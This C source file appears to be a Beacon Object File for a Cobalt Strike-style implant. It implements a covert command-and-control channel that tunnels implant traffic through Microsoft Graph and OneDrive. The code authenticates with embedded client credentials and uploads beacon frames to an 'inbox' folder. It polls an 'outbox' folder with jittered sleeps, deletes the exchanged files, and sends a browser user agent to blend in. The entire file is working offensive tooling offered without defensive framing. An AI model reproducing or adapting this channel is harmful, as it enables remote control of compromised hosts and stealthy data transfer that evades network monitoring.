#include <windows.h>
#include <wininet.h>
#include <stdarg.h>

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapReAlloc(HANDLE, DWORD, LPVOID, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount(VOID);

DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
DECLSPEC_IMPORT HINTERNET WINAPI WININET$HttpOpenRequestA(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
DECLSPEC_IMPORT BOOL      WINAPI WININET$HttpSendRequestA(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
DECLSPEC_IMPORT BOOL      WINAPI WININET$InternetReadFile(HINTERNET, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL      WINAPI WININET$InternetCloseHandle(HINTERNET);
DECLSPEC_IMPORT BOOL      WINAPI WININET$HttpQueryInfoA(HINTERNET, DWORD, LPVOID, LPDWORD, LPDWORD);

#include "config.h"

typedef int(*UDC2ProxyCall)(const char* sendBuf, int sendBufLen, char* recvBuf, int recvBufMaxLen);
typedef void(*UDC2ProxyClose)();

typedef struct _UDC2_INFO {
    DWORD version;
    UDC2ProxyCall proxyCall;
    UDC2ProxyClose proxyClose;
} UDC2_INFO, *PUDC2_INFO;

#define MAX_FRAME_SIZE      (250U * 1024U * 1024U)
#define HTTP_INITIAL_BUFFER 4096U
#define MAX_URL_LEN         2048
#define POLL_MIN_MS         800
#define POLL_MAX_MS         2500
// total relay downtime tolerance: ~MAX_POLL_ATTEMPTS * avg_sleep * MAX_PROXY_RETRIES (~27 min)
#define MAX_POLL_ATTEMPTS   180
#define MAX_SEND_RETRIES    3
#define MAX_DELETE_RETRIES  3
#define MAX_PROXY_RETRIES   5
#define RETRY_WAIT_MS       30000
#define TOKEN_LIFETIME      3500

typedef struct {
    BOOL     initialized;
    char*    accessToken;
    DWORD    tokenExpiry;
    HINTERNET hInet;
    BOOL     hasPendingRequest;
    char     pendingFilename[64];
} UDC2_STATE;

static UDC2_STATE gState = {0};

static char gSessionId[17] = {0};

static int myStrlen(const char* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void* myMemcpy(void* dst, const void* src, int n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    int i;
    for (i = 0; i < n; i++) d[i] = s[i];
    return dst;
}

static char* myStrstr(const char* haystack, const char* needle) {
    int nlen = myStrlen(needle);
    int hlen = myStrlen(haystack);
    int i, j;
    if (nlen == 0) return (char*)haystack;
    if (nlen > hlen) return NULL;
    for (i = 0; i <= hlen - nlen; i++) {
        for (j = 0; j < nlen; j++) {
            if (haystack[i + j] != needle[j]) break;
        }
        if (j == nlen) return (char*)(haystack + i);
    }
    return NULL;
}

static char* myStrchr(const char* s, int c) {
    while (*s) {
        if (*s == (char)c) return (char*)s;
        s++;
    }
    if (c == 0) return (char*)s;
    return NULL;
}

static int myUintToStr(char* buf, unsigned int val) {
    char tmp[12];
    int i = 0, j;
    if (val == 0) { tmp[i++] = '0'; }
    else { while (val > 0) { tmp[i++] = '0' + (val % 10); val /= 10; } }
    for (j = 0; j < i; j++) buf[j] = tmp[i - 1 - j];
    return i;
}

static int mySnprintf(char* buf, int bufsize, const char* fmt, ...) {
    va_list ap;
    const char* f = fmt;
    int pos = 0;
    int limit = bufsize - 1;

    va_start(ap, fmt);
    while (*f && pos < limit) {
        if (*f == '%' && *(f + 1)) {
            f++;
            if (*f == 's') {
                const char* s = va_arg(ap, const char*);
                if (s) {
                    while (*s && pos < limit) buf[pos++] = *s++;
                }
                f++;
            } else if (*f == 'u') {
                unsigned int val = va_arg(ap, unsigned int);
                char tmp[12];
                int tlen = myUintToStr(tmp, val);
                int j;
                for (j = 0; j < tlen && pos < limit; j++) buf[pos++] = tmp[j];
                f++;
            } else {
                buf[pos++] = '%';
                if (pos < limit) buf[pos++] = *f;
                f++;
            }
        } else {
            buf[pos++] = *f++;
        }
    }
    va_end(ap);
    buf[pos] = 0;
    return pos;
}

// no CRT available so we mix tick counts and stack addresses for entropy
static void generateSessionId(void) {
    char hex[] = "0123456789abcdef";
    DWORD t1 = KERNEL32$GetTickCount();
    DWORD t2, hi, lo;
    int i;
    KERNEL32$Sleep(1);
    t2 = KERNEL32$GetTickCount();
    t1 = t1 * 1103515245 + 12345;
    t2 = t2 * 1664525 + 1013904223;
    hi = t1 ^ (DWORD)(ULONG_PTR)&gState;
    lo = t2 ^ (DWORD)(ULONG_PTR)&gSessionId;
    hi = hi * 2654435761U;
    lo = lo * 2246822519U;
    for (i = 0; i < 8; i++)
        gSessionId[i] = hex[(hi >> (i * 4)) & 0xF];
    for (i = 0; i < 8; i++)
        gSessionId[8 + i] = hex[(lo >> (i * 4)) & 0xF];
    gSessionId[16] = 0;
}

static DWORD prngState = 0;

static DWORD jitteredSleep(void) {
    if (prngState == 0) prngState = KERNEL32$GetTickCount();
    prngState = prngState * 1103515245 + 12345;
    DWORD ms = POLL_MIN_MS + ((prngState >> 16) & 0x7FFF) % (POLL_MAX_MS - POLL_MIN_MS);
    KERNEL32$Sleep(ms);
    return ms;
}

static void* heapAlloc(SIZE_T size) {
    return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}

static void heapFree(void* ptr) {
    if (ptr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ptr);
}

static BOOL isFormUnreserved(unsigned char c) {
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '.' ||
            c == '_' || c == '~');
}

static char* formUrlEncode(const char* value) {
    static const char hex[] = "0123456789ABCDEF";
    int inputLen = myStrlen(value);
    int i, pos = 0;
    char* encoded;

    if (inputLen > 0x1FFFFFFF) return NULL;
    encoded = (char*)heapAlloc((SIZE_T)inputLen * 3 + 1);
    if (!encoded) return NULL;

    for (i = 0; i < inputLen; i++) {
        unsigned char c = (unsigned char)value[i];
        if (isFormUnreserved(c)) {
            encoded[pos++] = (char)c;
        } else {
            encoded[pos++] = '%';
            encoded[pos++] = hex[(c >> 4) & 0xF];
            encoded[pos++] = hex[c & 0xF];
        }
    }
    encoded[pos] = 0;
    return encoded;
}

static int httpGetStatusCode(HINTERNET hReq) {
    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    if (WININET$HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                               &statusCode, &size, NULL))
        return (int)statusCode;
    return 0;
}

static char* httpRequest(const char* host, const char* path, const char* method,
                         const char* headers, const char* body, int bodyLen,
                         int* responseLen, int* statusCode) {
    if (responseLen) *responseLen = 0;
    if (statusCode) *statusCode = 0;
    HINTERNET hConn = WININET$InternetConnectA(
        gState.hInet, host, INTERNET_DEFAULT_HTTPS_PORT,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) return NULL;

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD;

    HINTERNET hReq = WININET$HttpOpenRequestA(
        hConn, method, path, "HTTP/1.1", NULL, NULL, flags, 0);
    if (!hReq) {
        WININET$InternetCloseHandle(hConn);
        return NULL;
    }

    BOOL sent = WININET$HttpSendRequestA(
        hReq, headers, headers ? (DWORD)myStrlen(headers) : 0,
        (LPVOID)body, (DWORD)bodyLen);
    if (!sent) {
        WININET$InternetCloseHandle(hReq);
        WININET$InternetCloseHandle(hConn);
        return NULL;
    }

    if (statusCode) *statusCode = httpGetStatusCode(hReq);

    DWORD limit = MAX_FRAME_SIZE + 1;
    DWORD capacity = HTTP_INITIAL_BUFFER < limit ? HTTP_INITIAL_BUFFER : limit;
    char* response = (char*)heapAlloc((SIZE_T)capacity + 1);
    if (!response) goto read_failed;

    DWORD totalRead = 0;
    DWORD bytesRead = 0;
    while (1) {
        if (totalRead == capacity) {
            DWORD nextCapacity = capacity > limit / 2 ? limit : capacity * 2;
            char* grown = (char*)KERNEL32$HeapReAlloc(
                KERNEL32$GetProcessHeap(), 0, response, (SIZE_T)nextCapacity + 1);
            if (!grown) goto read_failed;
            response = grown;
            capacity = nextCapacity;
        }
        if (!WININET$InternetReadFile(hReq, response + totalRead,
                                      capacity - totalRead, &bytesRead))
            goto read_failed;
        if (bytesRead == 0) break;
        totalRead += bytesRead;
        if (totalRead >= MAX_FRAME_SIZE + 1) break;
    }
    response[totalRead] = 0;

    WININET$InternetCloseHandle(hReq);
    WININET$InternetCloseHandle(hConn);

    if (responseLen) *responseLen = (int)totalRead;
    return response;

read_failed:
    heapFree(response);
    WININET$InternetCloseHandle(hReq);
    WININET$InternetCloseHandle(hConn);
    return NULL;
}

static int acquireToken(void) {
    char* encClientId = formUrlEncode(CLIENT_ID);
    char* encClientSecret = formUrlEncode(CLIENT_SECRET);
    char* encScope = formUrlEncode("https://graph.microsoft.com/.default");
    int bodySize;
    char* postBody;

    if (!encClientId || !encClientSecret || !encScope) {
        heapFree(encClientId); heapFree(encClientSecret); heapFree(encScope);
        return -1;
    }

    bodySize = myStrlen(encClientId) + myStrlen(encClientSecret) +
               myStrlen(encScope) + 64;
    postBody = (char*)heapAlloc(bodySize);
    if (!postBody) {
        heapFree(encClientId); heapFree(encClientSecret); heapFree(encScope);
        return -1;
    }

    mySnprintf(postBody, bodySize,
        "grant_type=client_credentials"
        "&client_id=%s"
        "&client_secret=%s"
        "&scope=%s",
        encClientId, encClientSecret, encScope);

    heapFree(encClientId); heapFree(encClientSecret); heapFree(encScope);

    char* path = (char*)heapAlloc(512);
    if (!path) { heapFree(postBody); return -1; }
    mySnprintf(path, 512, "/%s/oauth2/v2.0/token", TENANT_ID);

    char* hdrs = "Content-Type: application/x-www-form-urlencoded\r\n";
    int status = 0;
    char* resp = httpRequest("login.microsoftonline.com", path, "POST",
                              hdrs, postBody, myStrlen(postBody), NULL, &status);
    heapFree(path);
    heapFree(postBody);

    if (!resp || status != 200) {
        heapFree(resp);
        return -1;
    }

    char* tokenStart = myStrstr(resp, "\"access_token\":\"");
    if (!tokenStart) { heapFree(resp); return -1; }
    tokenStart += 16;
    char* tokenEnd = myStrchr(tokenStart, '"');
    if (!tokenEnd) { heapFree(resp); return -1; }

    int tokenLen = (int)(tokenEnd - tokenStart);
    if (gState.accessToken) heapFree(gState.accessToken);
    gState.accessToken = (char*)heapAlloc(tokenLen + 1);
    if (!gState.accessToken) { heapFree(resp); return -1; }
    myMemcpy(gState.accessToken, tokenStart, tokenLen);
    gState.accessToken[tokenLen] = 0;
    gState.tokenExpiry = KERNEL32$GetTickCount() + (TOKEN_LIFETIME * 1000);

    heapFree(resp);
    return 0;
}

static int ensureToken(void) {
    if (gState.accessToken && (int)(gState.tokenExpiry - KERNEL32$GetTickCount()) > 0)
        return 0;
    return acquireToken();
}

static void invalidateToken(void) {
    heapFree(gState.accessToken);
    gState.accessToken = NULL;
}

static char* buildAuthHeader(void) {
    int tokenLen = myStrlen(gState.accessToken);
    char* hdr = (char*)heapAlloc(tokenLen + 256);
    if (!hdr) return NULL;
    mySnprintf(hdr, tokenLen + 256,
        "Authorization: Bearer %s\r\nContent-Type: application/json\r\n",
        gState.accessToken);
    return hdr;
}

static char* buildUploadHeader(void) {
    int tokenLen = myStrlen(gState.accessToken);
    char* hdr = (char*)heapAlloc(tokenLen + 256);
    if (!hdr) return NULL;
    mySnprintf(hdr, tokenLen + 256,
        "Authorization: Bearer %s\r\nContent-Type: application/octet-stream\r\n",
        gState.accessToken);
    return hdr;
}

static int graphUploadFile(const char* folderId, const char* filename,
                           const char* data, int dataLen) {
    int attempt;
    for (attempt = 0; attempt < 2; attempt++) {
        if (ensureToken() != 0) return -1;
        char* path = (char*)heapAlloc(MAX_URL_LEN);
        if (!path) return -1;
        mySnprintf(path, MAX_URL_LEN,
            "/v1.0/drives/%s/items/%s:/%s:/content",
            DRIVE_ID, folderId, filename);
        char* hdrs = buildUploadHeader();
        if (!hdrs) { heapFree(path); return -1; }
        int status = 0;
        char* resp = httpRequest("graph.microsoft.com", path, "PUT",
                                  hdrs, data, dataLen, NULL, &status);
        heapFree(path);
        heapFree(hdrs);
        heapFree(resp);
        if (status == 401 && attempt == 0) { invalidateToken(); continue; }
        if (status == 429) { KERNEL32$Sleep(2000); return -1; }
        return (status >= 200 && status < 300) ? 0 : -1;
    }
    return -1;
}

static char* graphDownloadFileByName(const char* folderId, const char* filename,
                                     int* respLen) {
    int attempt;
    for (attempt = 0; attempt < 2; attempt++) {
        if (ensureToken() != 0) return NULL;
        char* path = (char*)heapAlloc(MAX_URL_LEN);
        if (!path) return NULL;
        mySnprintf(path, MAX_URL_LEN,
            "/v1.0/drives/%s/items/%s:/%s:/content",
            DRIVE_ID, folderId, filename);
        char* hdrs = buildAuthHeader();
        if (!hdrs) { heapFree(path); return NULL; }
        int status = 0;
        char* resp = httpRequest("graph.microsoft.com", path, "GET",
                                  hdrs, NULL, 0, respLen, &status);
        heapFree(path);
        heapFree(hdrs);
        if (status == 401 && attempt == 0) {
            heapFree(resp); invalidateToken(); continue;
        }
        if (status == 404) { heapFree(resp); return NULL; }
        if (status == 429) { heapFree(resp); KERNEL32$Sleep(2000); return NULL; }
        if (!resp || status < 200 || status >= 300) { heapFree(resp); return NULL; }
        if (*respLen > (int)MAX_FRAME_SIZE) { heapFree(resp); return NULL; }
        return resp;
    }
    return NULL;
}

static int graphDeleteFileByName(const char* folderId, const char* filename) {
    int attempt;
    for (attempt = 0; attempt < 2; attempt++) {
        if (ensureToken() != 0) return -1;
        char* path = (char*)heapAlloc(MAX_URL_LEN);
        if (!path) return -1;
        mySnprintf(path, MAX_URL_LEN,
            "/v1.0/drives/%s/items/%s:/%s:",
            DRIVE_ID, folderId, filename);
        char* hdrs = buildAuthHeader();
        if (!hdrs) { heapFree(path); return -1; }
        int status = 0;
        char* resp = httpRequest("graph.microsoft.com", path, "DELETE",
                                  hdrs, NULL, 0, NULL, &status);
        heapFree(path);
        heapFree(hdrs);
        heapFree(resp);
        if (status == 401 && attempt == 0) { invalidateToken(); continue; }
        return ((status >= 200 && status < 300) || status == 404) ? 0 : -1;
    }
    return -1;
}

static void graphDeleteFileByNameWithRetry(const char* folderId,
                                           const char* filename) {
    int retry;
    for (retry = 0; retry < MAX_DELETE_RETRIES; retry++) {
        if (graphDeleteFileByName(folderId, filename) == 0)
            return;
        if (retry + 1 < MAX_DELETE_RETRIES)
            KERNEL32$Sleep(1000);
    }
}

int udc2Proxy(const char* sendBuf, int sendBufLen,
              char* recvBuf, int recvBufMaxLen) {

    int attempt, retry, proxyRetry;

    if (!gState.initialized) {
        generateSessionId();
        gState.hInet = WININET$InternetOpenA(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!gState.hInet) return -1;
        if (acquireToken() != 0) {
            WININET$InternetCloseHandle(gState.hInet);
            gState.hInet = NULL;
            return -1;
        }
        gState.initialized = TRUE;
    }

    if (sendBuf && sendBufLen > 0) {
        if (gState.hasPendingRequest)
            return -1;
        if (sendBufLen < 4 || (unsigned int)sendBufLen > MAX_FRAME_SIZE)
            return -1;
        {
            DWORD declaredLen = ((DWORD)(unsigned char)sendBuf[0])
                | ((DWORD)(unsigned char)sendBuf[1] << 8)
                | ((DWORD)(unsigned char)sendBuf[2] << 16)
                | ((DWORD)(unsigned char)sendBuf[3] << 24);
            if (declaredLen != (DWORD)(sendBufLen - 4))
                return -1;
        }

        // retry the whole send+poll cycle if relay was down
        for (proxyRetry = 0; proxyRetry <= MAX_PROXY_RETRIES; proxyRetry++) {

            if (proxyRetry > 0)
                KERNEL32$Sleep(RETRY_WAIT_MS);

            mySnprintf(gState.pendingFilename, 64, "S%s_%u",
                       gSessionId, KERNEL32$GetTickCount());

            int sent = -1;
            for (retry = 0; retry < MAX_SEND_RETRIES; retry++) {
                sent = graphUploadFile(INBOX_FOLDER_ID, gState.pendingFilename,
                                       sendBuf, sendBufLen);
                if (sent == 0) break;
                KERNEL32$Sleep(1000);
            }
            if (sent != 0) {
                gState.pendingFilename[0] = 0;
                continue;
            }
            gState.hasPendingRequest = TRUE;

            for (attempt = 0; attempt < MAX_POLL_ATTEMPTS; attempt++) {
                int contentLen = 0;
                char* content;

                jitteredSleep();

                content = graphDownloadFileByName(OUTBOX_FOLDER_ID,
                                                  gState.pendingFilename, &contentLen);
                if (!content) continue;

                if (contentLen < 4) {
                    heapFree(content);
                    graphDeleteFileByNameWithRetry(
                        OUTBOX_FOLDER_ID, gState.pendingFilename);
                    gState.hasPendingRequest = FALSE;
                    gState.pendingFilename[0] = 0;
                    return -1;
                }

                DWORD declared = ((DWORD)(unsigned char)content[0])
                    | ((DWORD)(unsigned char)content[1] << 8)
                    | ((DWORD)(unsigned char)content[2] << 16)
                    | ((DWORD)(unsigned char)content[3] << 24);
                if (declared != (DWORD)(contentLen - 4)) {
                    heapFree(content);
                    graphDeleteFileByNameWithRetry(
                        OUTBOX_FOLDER_ID, gState.pendingFilename);
                    gState.hasPendingRequest = FALSE;
                    gState.pendingFilename[0] = 0;
                    return -1;
                }

                if (contentLen > recvBufMaxLen) {
                    heapFree(content);
                    graphDeleteFileByNameWithRetry(
                        OUTBOX_FOLDER_ID, gState.pendingFilename);
                    gState.hasPendingRequest = FALSE;
                    gState.pendingFilename[0] = 0;
                    return -1;
                }

                myMemcpy(recvBuf, content, contentLen);
                heapFree(content);
                graphDeleteFileByNameWithRetry(
                    OUTBOX_FOLDER_ID, gState.pendingFilename);
                gState.hasPendingRequest = FALSE;
                gState.pendingFilename[0] = 0;
                return contentLen;
            }

            if (gState.hasPendingRequest) {
                graphDeleteFileByNameWithRetry(
                    INBOX_FOLDER_ID, gState.pendingFilename);
                gState.hasPendingRequest = FALSE;
                gState.pendingFilename[0] = 0;
            }
        }

        return -1;
    }

    return 0;
}

void udc2Close(void) {
    if (gState.accessToken) {
        heapFree(gState.accessToken);
        gState.accessToken = NULL;
    }
    if (gState.hInet) {
        WININET$InternetCloseHandle(gState.hInet);
        gState.hInet = NULL;
    }
    gState.initialized = FALSE;
    gState.hasPendingRequest = FALSE;
    gState.pendingFilename[0] = 0;
}

void go(char* args, int alen) {
    PUDC2_INFO info;
    (void)alen;
    if (!args) return;
    info = (PUDC2_INFO)args;
    info->proxyCall = udc2Proxy;
    info->proxyClose = udc2Close;
}
